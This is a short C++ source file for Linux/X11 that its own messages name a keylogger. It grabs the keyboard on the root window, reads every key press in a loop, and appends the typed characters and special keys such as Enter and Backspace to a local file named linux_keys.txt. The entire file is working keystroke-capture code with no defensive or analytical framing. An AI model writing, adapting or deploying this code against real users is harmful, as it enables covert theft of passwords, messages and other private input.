#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <fstream>
#include <iostream>
#include <unistd.h>

using namespace std;

void logKey(string key) {
    ofstream logFile("linux_keys.txt", ios::app);
    if (logFile.is_open()) {
        logFile << key;
        logFile.close();
    }
}

int main() {
    Display* display = XOpenDisplay(nullptr);
    if (display == nullptr) {
        cerr << "Erro ao abrir o display X.\n";
        return 1;
    }

    Window root = DefaultRootWindow(display);
    XEvent event;
    char keybuf[32];
    KeySym keysym;

    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);

    cout << "Keylogger rodando... Pressione Ctrl+C para parar.\n";

    while (true) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            int len = XLookupString(&event.xkey, keybuf, sizeof(keybuf), &keysym, nullptr);
            if (len > 0) {
                logKey(string(1, keybuf[0]));
            } else {
                // Teclas especiais
                switch (keysym) {
                    case XK_Return: logKey("[ENTER]"); break;
                    case XK_BackSpace: logKey("[BACKSPACE]"); break;
                    case XK_Tab: logKey("[TAB]"); break;
                    case XK_Escape: logKey("[ESC]"); break;
                    case XK_space: logKey(" "); break;
                    default:
                        // Ignora outras teclas por simplicidade
                        break;
                }
            }
        }
    }

    XCloseDisplay(display);
    return 0;
}
